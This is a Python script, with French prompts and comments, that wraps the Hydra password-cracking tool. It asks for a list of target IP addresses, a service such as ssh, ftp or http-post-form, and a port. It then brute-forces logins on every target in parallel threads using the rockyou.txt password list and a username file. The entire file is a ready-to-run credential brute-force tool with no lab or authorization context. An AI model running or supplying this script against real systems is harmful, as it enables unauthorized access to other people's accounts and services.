import subprocess
from pathlib import Path
import threading

def ask_list(prompt):
    """Demande une liste d’éléments séparés par des virgules."""
    raw = input(prompt).strip()
    return [item.strip() for item in raw.split(",") if item.strip()]

def run_hydra_attack(ip, service, port, usernames_path, wordlist_path):
    print(f"\n[>] Lancement de l'attaque sur {ip}")

    target = f"{service}://{ip}"
    if port:
        target += f":{port}"

    command = [
        "hydra",
        "-L", usernames_path,
        "-P", wordlist_path,
        "-t", "4",  # Threads Hydra
        target
    ]

    print(f"[+] Commande : {' '.join(command)}")
    try:
        result = subprocess.run(command, text=True)
        if result.returncode != 0:
            print(f"[!] Échec ou erreur sur {ip} (code {result.returncode})")
        else:
            print(f"[✓] Attaque terminée sur {ip}")
    except FileNotFoundError:
        print("[!] Erreur : hydra n'est pas installé.")
    except Exception as e:
        print(f"[!] Erreur inattendue sur {ip} : {e}")

def main():
    print("=== Hydra Brute Force Wrapper (Multithreaded) ===\n")

    target_ips = ask_list("Adresses IP cibles (séparées par des virgules) : ")
    service = input("Service (ex: ftp, ssh, http-post-form) : ").strip()
    port = input("Port (laisser vide pour le port par défaut) : ").strip()

    # Vérification des fichiers nécessaires
    script_dir = Path(__file__).parent
    wordlist_path = script_dir / "rockyou.txt"
    usernames_path = script_dir / "usernames.txt"

    if not wordlist_path.exists():
        print(f"[!] Fichier rockyou.txt introuvable : {wordlist_path}")
        return
    if not usernames_path.exists():
        print(f"[!] Fichier usernames.txt introuvable : {usernames_path}")
        return

    # Lancement de chaque attaque dans un thread
    threads = []
    for ip in target_ips:
        t = threading.Thread(
            target=run_hydra_attack,
            args=(ip, service, port, str(usernames_path.resolve()), str(wordlist_path.resolve()))
        )
        t.start()
        threads.append(t)

    # Attendre que tous les threads se terminent
    for t in threads:
        t.join()

    print("\n✅ Toutes les attaques sont terminées.")

if __name__ == "__main__":
    main()
